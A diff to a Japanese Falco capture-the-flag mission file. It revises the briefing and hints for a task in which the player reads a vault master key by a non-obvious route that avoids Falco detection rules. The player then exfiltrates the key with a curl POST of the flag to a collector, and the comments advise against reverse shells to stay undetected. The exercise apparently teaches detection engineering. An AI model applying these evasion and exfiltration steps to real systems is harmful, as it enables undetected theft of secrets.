@@ -11,7 +11,8 @@ briefing: >-
   自動的には解除されない)。加えてこのミッションは、素朴な cat を避けた「別経路での
   読み」を実際に使ったことを示す positive-proof ルール (Nimbus Vault Master Key Read)
   の発火を CLEARED の条件にしている — このルールが Me 画面の「発火させた Falco
-  ルール」に出るのは正常で、ここだけ他ミッションと逆に、発火させないと成立しない。
+  ルール」(UI 見出し "Falco rules you triggered (last 60s)") に出るのは正常で、
+  ここだけ他ミッションと逆に、発火させないと成立しない。
   単に読んで持ち出すだけでは通らない (requireExfil)。
 steps:
   - label: 禁止ルールを踏まずに master key を読む
@@ -71,10 +72,12 @@ hints:
         -d "{\"user\":\"$FALCO_CTF_USER\",\"flag\":\"$FLAG\"}"
       # 既存の curl で collector へ静かに HTTP POST。reverse shell や自前バイナリの
       # drop+実行は禁止ルールに触れるのでここでは使わない。
-      # 提出操作は不要 — collector が exfil を受け取った後、禁止ルールを 1 つも
-      # 踏んでいなければ数秒以内に自動で CLEARED になる (1 つでも発火させていた
-      # 場合はこの attempt では通らない。やり直すと exfil の記録も消えるので、
-      # その場合は curl の送信からやり直すこと)
+      # 提出操作は不要 — collector が exfil を受け取り、proof ルール
+      # (Nimbus Vault Master Key Read) が発火済みで、禁止ルールを 1 つも
+      # 踏んでいなければ数秒以内に自動で CLEARED になる (別経路での読み自体が
+      # proof を立てるので、通常は追加操作は要らない。禁止ルールを 1 つでも
+      # 発火させていた場合はこの attempt では通らない。やり直すと exfil の
+      # 記録も消えるので、その場合は curl の送信からやり直すこと)
 bridge: >-
   master key は、Falco に一度も気づかれることなく箱の外へ抜けた。CTF Company の
   キルチェーンは踏破 — だが本当の学びは攻撃側ではない。あなたが避けた検知の一つ一つが、
